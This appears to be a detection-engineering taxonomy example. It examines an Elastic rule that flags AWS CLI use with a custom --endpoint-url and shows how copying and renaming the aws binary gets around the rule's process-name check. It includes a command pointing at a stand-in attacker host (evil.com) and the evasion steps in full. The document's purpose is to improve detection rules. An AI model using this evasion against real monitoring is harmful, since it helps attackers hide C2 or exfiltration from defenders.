# ADE3-01 Example: AWS CLI Process Cloning

**Bug Category:** ADE3-01 Context Development - Process Cloning

## Original Rule

**Source:** [Elastic Security - AWS CLI Command with Custom Endpoint URL](https://github.com/elastic/detection-rules/blob/main/rules/linux/command_and_control_aws_cli_endpoint_url_used.toml)

**Description:** Searches for use of AWS CLI with a `--endpoint-url` argument, which allows users to specify a custom endpoint URL for AWS services. The action can be leveraged by attackers to redirect API requests to malicious endpoints for C2 or exfiltration.

```SQL
query = '''
host.os.type:"linux" and event.category:"process" and
event.action:("exec" or "exec_event" or "executed" or "process_started" or "ProcessRollup2") and
process.name:"aws" and process.args:"--endpoint-url"
'''
```

## Expected Detection

**Legitimate command that should trigger:**
```bash
aws s3 ls --endpoint-url https://custom-s3-endpoint.evil.com
```

## Detection Logic Analysis

The rule relies on:
- `process.name:"aws"` - String-based process name identification

**Bug:** The rule implicitly assumes the attacker cannot clone or rename the `aws` binary.

## The Bug: ADE3-01 Context Development - Process Cloning

**Definition:** Detection logic relies on **string-based identification of a process or binary**, while implicitly assuming the attacker cannot clone or rename binaries.

**In this case:**
- Rule only checks `process.name` field
- `process.name` is mutable (reflects the name of the executed binary)
- Attacker can duplicate and rename the binary

**Why It Works:**
- Cloned binary has identical functionality
- File hash remains the same (same binary, different name)
- Only the `process.name` field changes in logs
- Detection rule only checks `process.name`, not hash/signature

## Bypass - Process Cloning

### Rule Bypass 1: Process cloning to evade detection

**Attack steps:**

1. Clone the AWS CLI binary:
   ```bash
   cp /usr/bin/aws /usr/tmp/foo
   ```

2. Use cloned binary with malicious endpoint:
   ```bash
   /usr/tmp/foo s3 ls --endpoint-url https://custom-s3-endpoint.evil.com
   ```

**Result:** **False Negative** - No alert generated

**Why it bypasses detection:**
- Process creation log shows `process.name: "foo"` (not "aws")
- Rule condition `process.name:"aws"` fails to match
- All other conditions remain satisfied (args contain `--endpoint-url`)

### Contextual Development

The attacker **develops the context** by:

1. **Additional step:** Clone binary prior to executing in-scope technique
2. **Poison data:** Process name field now contains "foo" instead of "aws"
3. **Same behavior:** Binary executes identically to original `aws` CLI

**Key insight:** The attacker doesn't need special permissions beyond what's already required to run `aws`:
- If root: can clone to `/usr/tmp/foo` or anywhere
- If non-root: can clone to user-writable directory like `~/foo` or `/tmp/foo`

## Why This Is ADE3 (Not ADE2)

**ADE2-01 (Omit Alternatives - Method/Binary):** Rule omits alternative methods of achieving the same outcome

**ADE3-01 (Process Cloning):** Rule relies on string-based process identification, attacker adds a step to manipulate that string

**Difference:**
- ADE2: Alternative already exists (different API, different binary)
- ADE3: Attacker creates the alternative by cloning/renaming

## Impact

**False Negative:** Attacker can:
- Clone `aws` binary to any name
- Execute all AWS CLI commands with custom endpoints
- Bypass detection entirely

**Combined with ADE3-02:**

This rule also has an **aggregation hijacking** bug ([see example](aws-cli-new-terms-hijacking.md)):
- New terms rule groups by `host.id` only
- Attacker can poison baseline with false positives
- Combined impact: Multiple bypass paths

## Related Examples

This rule contains **multiple bugs:**

1. **ADE3-01:** Process Cloning (this example)
2. **ADE3-02:** Aggregation Hijacking via new_terms ([see example](aws-cli-new-terms-hijacking.md))

**Stacked impact:** Attacker can bypass using either method independently.

---

**Related Documentation:**
- [ADE3 Context Development](../../docs/taxonomy/ade3-context-development.md)
- [ADE3-02 Aggregation Hijacking Example](aws-cli-new-terms-hijacking.md)
- [ADE2 Omit Alternatives](../../docs/taxonomy/ade2-omit-alternatives.md)
